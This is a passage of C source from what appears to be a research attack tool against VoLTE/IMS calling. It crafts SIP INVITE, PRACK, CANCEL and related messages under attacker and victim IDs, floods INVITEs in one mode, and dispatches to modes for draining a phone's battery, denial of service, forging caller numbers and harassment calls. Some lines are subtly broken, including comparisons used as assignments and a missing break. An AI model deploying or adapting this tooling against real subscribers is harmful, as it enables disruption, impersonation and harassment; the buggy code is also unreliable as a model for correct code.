        for(int i=0; i<sessions_len; i++) {
            if(sessions[i].call_id_len == strlen(sip_arr[0].call_id) &&
                    strcmp(sessions[i].call_id, sip_arr[0].call_id) == 0 &&
                    sessions[i].host_len == strlen(sip_arr[0].caller_id) &&
                    strcmp(sessions[i].host, sip_arr[0].caller_id) == 0 &&
                    sessions[i].port == (((strcmp(new_s->host, "alice") == 0) ? 8222: 8224)) &&
                    sessions[i].method == 5 &&
                    sessions[i].state == 1
              ) {
                sessions[i].method == 6;
                sessions[i].state == 2;
                break;
            }

        }


        nb = read_file("ok2_t.bin", sip_data);
        nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

        if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
            perror("sendto()");
            exit(-1);
        }
        puts("OK");

        wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[1], stat_ok, 0, DISABLE_TCP_ACK);
        wait_sip_all_stac(dev_r, &net, &esp, &txp, &sip_arr[1], stat_ok, 0, DISABLE_TCP_ACK);

        nb = read_file("ring1_t.bin", sip_data);
        nb = compose_sip(&net, &sip_arr[0], sip_data, nb );

        if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
            perror("sendto()");
            exit(-1);
        }
        puts("RING");
    }
}

int passive_UDP(short port)
{
    int udp_client_fd;
    struct sockaddr_in client_addr;
    // bind udp port
    if((udp_client_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket()");
        exit(-1);
    }
    int flag = 1, flen = sizeof(int);

    if(setsockopt(udp_client_fd, SOL_SOCKET, SO_REUSEADDR, &flag, flen) == -1) {
        perror("setsocketopt()");
        exit(-1);
    }
    
    memset((char*)&client_addr, 0, sizeof(client_addr));

    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(port);

    if((bind(udp_client_fd, (struct sockaddr *)&client_addr, sizeof(client_addr))) < 0) {
        perror("bind()");
        exit(-1);
    }
    return udp_client_fd;
}
// for generate cseq
void gen_rand_number_str(char *cseq) {
    srand(time(NULL));
	int a = (rand() % 700) + 1;
    snprintf(cseq, CSEQBUFLEN, "%d", a);
}
void send_invite(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip *sip, char *ATKID, char *VICID)
{
    uint8_t sip_data[BUFSIZE];
    ssize_t nb = read_file("inv1_t.bin", sip_data);
    sip->gen_flds(net, ATKID, VICID, sip);
    gen_rnd_str(sip->from_tag, 5);
    gen_rand_number_str(sip->cseq);
    nb = compose_sip(net, sip, sip_data, nb );
    socklen_t server_size = sizeof(struct sockaddr_in);
    // send invite to port 4060
    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: INV");
}
void send_prack(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip *sip)
{
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    ssize_t nb = read_file("prack1_t.bin", sip_data);
    nb = compose_sip(net, sip, sip_data, nb );

    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: PRACK");
}
void twin_wait_sip(Dev *dev, Net *net, Esp *esp, Txp *txp, Sip *sip, SipStats stat[], int mode)
{
        while(1) {
            wait_sip_all_stac(dev, net, esp, txp, sip, stat, 0, DISABLE_TCP_ACK);
            if (ntohs(txp->uhdr.dest) == (mode <= 1 ? 8222 : 8224))
                break;
        }
}

void send_bye(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip sip_arr[])
{
    // send sprog to port 4060
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    size_t nb = read_file("bye1_t.bin", sip_data);
    sprintf(sip_arr[0].cseq, "%d", atoi(sip_arr[0].cseq) + 2);
    nb = compose_sip(net, &sip_arr[0], sip_data, nb );
    sprintf(sip_arr[0].cseq, "%d", atoi(sip_arr[0].cseq) - 2);

    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: BYE");
}
void send_cancel(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip sip_arr[])
{
    // send sprog to port 4060
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    size_t nb = read_file("cancel1_t.bin", sip_data);
    nb = compose_sip(net, &sip_arr[0], sip_data, nb );

    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: CANCEL");
}
void send_ack(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip sip_arr[])
{
    // send sprog to port 4060
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    size_t nb = read_file("ack1_t.bin", sip_data);
    nb = compose_sip(net, &sip_arr[0], sip_data, nb );

    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: ACK");
}
/*
 * mode: 0: establish a call w/o bye
 *       1: establish a call w/ bye
 *       2: establish a call w/ bye (send prack after pressing enter)
 */
void twin_establish_call(int udp_client_fd, struct sockaddr_in server_addr, Dev *dev, Net *net, Esp *esp, Txp *txp, Sip sip_arr[], char* ATKID, char* VICID, int mode)
{
    SipStats sprog[] = {SPROC, UNKN_STAT};
    SipStats trying[] = {TRY, UNKN_STAT};
    SipStats ringing[] = {RING, UNKN_STAT};
    int through = 0;
    while(through == 0) {
        send_invite(udp_client_fd, server_addr, net, &sip_arr[0], ATKID, VICID);

        twin_wait_sip(dev, net, esp, txp, &sip_arr[1], trying, mode);
        puts("Recv: TRYING");
        twin_wait_sip(dev, net, esp, txp, &sip_arr[1], sprog, mode);
        puts("Recv: SPROG");

        strcpy(sip_arr[0].from_tag, sip_arr[1].from_tag);
        strcpy(sip_arr[0].to_tag, sip_arr[1].to_tag);
        sprintf(sip_arr[1].cseq, "%d", atoi(sip_arr[0].cseq) + 1);
        through = 1;
        if (mode == 2) {
            printf("resend INVITE (0) or send PRACK (1)?: ");
            scanf("%d", &through);
        }
    }
    send_prack(udp_client_fd, server_addr, net, &sip_arr[1]);
    twin_wait_sip(dev, net, esp, txp, &sip_arr[1], ringing, mode);
    puts("Recv: RINGING");
    twin_wait_sip(dev, net, esp, txp, &sip_arr[1], stat_ok, mode);
    puts("Recv: OK for INVITE");
    send_ack(udp_client_fd, server_addr, net, &sip_arr[0]);
    if(mode)
    {
        puts("Waiting 2 second...");
        wait_sip_all_stac(dev, net, esp, txp, &sip_arr[1], stat_null, 2, DISABLE_TCP_ACK);
        send_cancel(udp_client_fd, server_addr, net, sip_arr);
    }
}
// [program] -w -I lo -O SD -A [alice | yichen] -V bob
void twin_caller_localhost(char *OPERATOR,
                        char *INTERFACE,
                        char *ATKID,
                        char *VICID)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INTERFACE);
    HANDLE_ARG_ERR(ATKID);
    HANDLE_ARG_ERR(VICID);

    Dev dev;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip_arr[2];

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip_arr[0]);
    init_sip(&sip_arr[1]);

    get_twin_register_info(&dev, &net, &esp, &txp, &sip_arr[0]);
    // wait for 5 second
    wait_sip(&dev, &net, &esp, &txp, &sip_arr[1], meth_null, stat_null, 5, DISABLE_TCP_ACK);
    int mode;
    while (1)
    {
        printf("input mode (0, 1 for alice; 2, 3 for yichen): ");
        scanf("%d", &mode);
        getchar(); // flush newline

        int udp_client_fd = passive_UDP(mode <= 1 ? 8222 : 8224);
        struct sockaddr_in server_addr;

        memset((char*)&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        server_addr.sin_port = htons(4060);

        printf("TWIN CALLER START (mode %s)\n", mode == 0 ? "W/ PRACK W/O BYE" : (mode == 1 ? "W/ PRACK BYE" : (mode == 2 ? "DELAY PRACK" : "W/O PRACK")));
        if (mode <= 1) { // it better be alice
            twin_establish_call(udp_client_fd, server_addr, &dev, &net, &esp, &txp, sip_arr, ATKID, VICID, mode);
        } else { 
            if (mode == 2)
                twin_establish_call(udp_client_fd, server_addr, &dev, &net, &esp, &txp, sip_arr, ATKID, VICID, mode);
            else { // send invite w/o prack for 18 times
                for(int i = 0; i < 18; i++) {
                    send_invite(udp_client_fd, server_addr, &net, &sip_arr[0], ATKID, VICID);
                    wait_sip_all_stac(&dev, &net, &esp, &txp, &sip_arr[1], stat_null, 0.1, DISABLE_TCP_ACK);
                }
            }
        }
    }
}

typedef struct Session_INFO {
    int call_id_len;
    char call_id[100];
    int host_len;
    char host[10];
    int port;
    //int method;
    //int state;
    Sip sip;
} session_info;

// alice should be at port 8222 and another caller at port 8224
int choose_existing_sessions(session_info *sessions, int sessions_len, Sip sip_arr[])
{
    // scan existing sessions to choose matched index
    for(int i = 0; i < sessions_len; i++) {
        if( sessions[i].call_id_len == strlen(sip_arr[0].call_id) &&
            strcmp(sessions[i].call_id, sip_arr[0].call_id) == 0 &&
            sessions[i].host_len == strlen(sip_arr[0].caller_id) &&
            strcmp(sessions[i].host, sip_arr[0].caller_id) == 0 &&
            sessions[i].port == (((strcmp(sessions[i].host, "alice") == 0) ? 8222: 8224))
          ) {
            return i;
        }
    }
    return -1;
}

void send_trying(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip sip_arr[])
{
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    ssize_t nb = read_file("try1_t.bin", sip_data);
    nb = compose_sip(net, &sip_arr[0], sip_data, nb );

    // send trying to port 4060
    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: TRY");
}

void send_sprog(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip sip_arr[])
{
    // send sprog to port 4060
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    size_t nb = read_file("sprog1_t.bin", sip_data);
    gen_rnd_str(sip_arr[0].to_tag, 5);
    nb = compose_sip(net, &sip_arr[0], sip_data, nb );

    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: SPROG");
}
void send_req_term(int udp_client_fd, struct sockaddr_in server_addr, Net *net, Sip sip_arr[])
{
    // send sprog to port 4060
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    size_t nb = read_file("reqterm1_t.bin", sip_data);
    nb = compose_sip(net, &sip_arr[0], sip_data, nb );

    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
    puts("Send: REQUEST_TERMINATED");
}
void send_ok_or_ringing(int udp_client_fd, char *filename, struct sockaddr_in server_addr, Net *net, Sip sip_arr[])
{
    // send ok for prack ("ok2_t.bin") or invite ("ok1_t.bin")
    // or send ringing
    uint8_t sip_data[BUFSIZE];
    socklen_t server_size = sizeof(struct sockaddr_in);
    size_t nb = read_file(filename, sip_data);
    nb = compose_sip(net, &sip_arr[0], sip_data, nb );

    // send trying to port 4060
    if(sendto(udp_client_fd, sip_data, nb, 0, (struct sockaddr*)&server_addr, server_size) < -1 ) {
        perror("sendto()");
        exit(-1);
    }
}

void free_sessions(session_info *sessions, int chose_idx, int sessions_len, int udp_client_fd, struct sockaddr_in server_addr, Net *net) 
{
    for(int i = 0; i < sessions_len; i++) {
        if (i != chose_idx) {
            //send_ok_or_ringing(udp_client_fd, "ok1_t.bin", server_addr, net, &sessions[i].sip);
            send_cancel(udp_client_fd, server_addr, net, &sessions[i].sip);
        }
        free(sessions[i].sip.cseq);
        free(sessions[i].sip.branch_id);
    }
}
int inc_sessions(session_info *sessions, int sessions_len, Sip sip_arr[]) 
{
    for(int i = 0; i < sessions_len; i++) {
        if(sessions[i].call_id_len == strlen(sip_arr[0].call_id) &&
                strcmp(sessions[i].call_id, sip_arr[0].call_id) == 0 &&
                sessions[i].host_len == strlen(sip_arr[0].caller_id) &&
                strcmp(sessions[i].host, sip_arr[0].caller_id) == 0 &&
                sessions[i].port == (((strcmp(sessions[i].host, "alice") == 0) ? 8222: 8224))// &&
          ) {
            // repeated INVITE
            fprintf(stderr, "existing INVITE\n");
            return sessions_len;
        }
    }
    // sessions_len start from 0
    session_info *new_s = sessions + sessions_len;
    strcpy(new_s->call_id, sip_arr[0].call_id);
    new_s->call_id_len = strlen(new_s->call_id);
    strcpy(new_s->host, sip_arr[0].caller_id);
    new_s->host_len = strlen(new_s->host);
    new_s->port = ((strcmp(new_s->host, "alice") == 0) ? 8222: 8224); // so alice should set to 8222
    new_s->sip = sip_arr[0];
    new_s->sip.cseq = malloc(CSEQBUFLEN);
    strcpy(new_s->sip.cseq, sip_arr[0].cseq);
    new_s->sip.branch_id = malloc(BRACHIDBUFLEN);
    strcpy(new_s->sip.branch_id, sip_arr[0].branch_id);
    return sessions_len + 1;
}

void twin_callee_localhost(char *OPERATOR, char *INTERFACE, char *INTERFACE_R)
{
    HANDLE_ARG_ERR(OPERATOR);
    HANDLE_ARG_ERR(INTERFACE);

    session_info sessions[101];
    int sessions_len = 0;

    Dev dev;
    Dev Dev_r;
    Dev *dev_r;
    Net net;
    Esp esp;
    Txp txp;
    Sip sip_arr[2];

    init_dev(&dev, INTERFACE);
    init_net(&net, OPERATOR);
    init_esp(&esp);
    init_txp(&txp);
    init_sip(&sip_arr[0]);
    init_sip(&sip_arr[1]);

    if(INTERFACE_R == NULL) {
        dev_r = &dev;
    } else {
        dev_r = &Dev_r;
        init_dev(dev_r, INTERFACE_R);
    }
    dev_r->dev_s = &dev;

    get_twin_register_info(dev_r, &net, &esp, &txp, &sip_arr[0]);

    // wait for 5 second
    wait_sip(dev_r, &net, &esp, &txp, &sip_arr[1], meth_null, stat_null, 5, DISABLE_TCP_ACK);

    int udp_client_fd = passive_UDP(8223);
    struct sockaddr_in server_addr;

    memset((char*)&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    server_addr.sin_port = htons(4060);

    puts("TW CALLEE START");
    while(1) {
        // filter other traffic on localhost
        // wait invite or prack to port 4060
        int count = 0;
        while(1) {
            wait_sip_all_meth(dev_r, &net, &esp, &txp, &sip_arr[0], meth_invprack, 0, DISABLE_TCP_ACK);
            if (ntohs(txp.uhdr.dest) == 8223){
                count++; // receive duplicated sip for unknown reason
                if (count >= 2){
                    count = 0;
                    break;
                }
            }
        }
        // so client should be set to 8224
        if(sip_arr[0].meth == INV) {
            puts("Recv: INVITE");
            sessions_len = inc_sessions(sessions, sessions_len, sip_arr);
            send_trying(udp_client_fd, server_addr, &net, sip_arr);
            send_sprog(udp_client_fd, server_addr, &net, sip_arr);
        } else if(sip_arr[0].meth == PRACK) {
            // this will reset sessions_len
            puts("Recv: PRACK");
            int chose_idx = choose_existing_sessions(sessions, sessions_len, sip_arr);
            // send ok to which has sent prack
            //getchar();
            send_ok_or_ringing(udp_client_fd, "ok2_t.bin", server_addr, &net, sip_arr);
            puts("Send: OK for PRACK");
            if (chose_idx < 0) {
                fprintf(stderr, "Received PRACK has no corresponding session, maybe be cleared\n");
                continue;
            }
            wait_sip_all_stac(&dev, &net, &esp, &txp, &sip_arr[1], stat_null, 0.1, DISABLE_TCP_ACK);
            // use sessions[chose_idx].sip for CSeq (sessions[chose_idx].sip.cseq == sip_arr[0].cseq - 1 (CSeq for PRACK - 1) for now)
            send_ok_or_ringing(udp_client_fd, "ring1_t.bin", server_addr, &net, &sessions[chose_idx].sip);
            puts("Send: RINGING");
            wait_sip_all_stac(&dev, &net, &esp, &txp, &sip_arr[1], stat_null, 0.1, DISABLE_TCP_ACK);
            send_ok_or_ringing(udp_client_fd, "ok1_t.bin", server_addr, &net, &sessions[chose_idx].sip);
            puts("Send: OK for INVITE");
            // send cancel to other sessions
            free_sessions(sessions, chose_idx, sessions_len, udp_client_fd, server_addr, &net);
            sessions_len = 0;
        }
    }
}

int main(int argc, char *argv[])
{
    Arg arg;

    init_argu(&arg);
    parse_arg(argc, argv, &arg);

    switch(arg.t) {
        case TX:
            tx_bin_data(arg.iface, arg.fname);
            break;
        case RX:
            rx_and_show_dissect_res(arg.opr, arg.iface);
            break;
        case ATTEMPT_TO_CALL:
            attempt_to_make_call(arg.opr, arg.i, arg.iface, arg.atkid, arg.vicid);
            break;
        case DRAIN_UE_BATTERY:
            drain_ue_battery(arg.opr, arg.i, arg.iface, arg.atkid, arg.vicid);
        case DOS_UE:
            dos_ue(arg.opr, arg.iface, arg.iface_r, arg.m, arg.servaddr, arg.servport, arg.atkid, arg.vicid);
            break;
        case FORGE_NO:
            forge_no(arg.opr, arg.i, arg.iface, arg.atkid, arg.vicid);
            break;
        case DATA_CH:
            estab_dchannel(arg.opr, arg.m, arg.i, arg.iface, arg.rmtid);
            break;
        case SIMO_HARASS_CALL:
            estab_simo_multi_session(arg.opr, arg.i, arg.iface, arg.blist, arg.atkid);
            break;
        case HARASS_CALL:
            estab_multi_session(arg.opr, arg.i, arg.iface, arg.blist, arg.atkid);
            break;
        case CALLEE: //sudo ./pc_call_sim -e -I lo -O SD -N lo
            twin_callee_localhost(arg.opr, arg.iface, arg.iface_r);
            break;
        case TWIN_CALLER: // sudo ./pc_call_sim -w -I lo -O SD -A [alice | yichen] -V bob
            twin_caller_localhost(arg.opr, arg.iface, arg.atkid, arg.vicid);
            break;
        default:
            exit(EXIT_FAILURE);
    }
}
